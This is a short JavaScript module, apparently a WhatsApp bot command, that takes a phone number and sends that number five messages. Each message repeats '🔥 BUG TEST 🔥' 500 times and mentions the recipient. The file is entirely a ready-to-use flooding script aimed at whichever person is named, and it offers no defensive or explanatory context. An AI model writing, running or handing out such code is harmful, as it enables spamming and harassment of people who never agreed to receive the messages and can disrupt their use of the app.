module.exports = async (sock, number) => {
    const jid = number.includes('@s.whatsapp.net') ? number : `${number}@s.whatsapp.net`;

    for (let i = 0; i < 5; i++) {
        await sock.sendMessage(jid, {
            text: "🔥 BUG TEST 🔥\n".repeat(500),
            mentions: [jid]
        });
    }
};
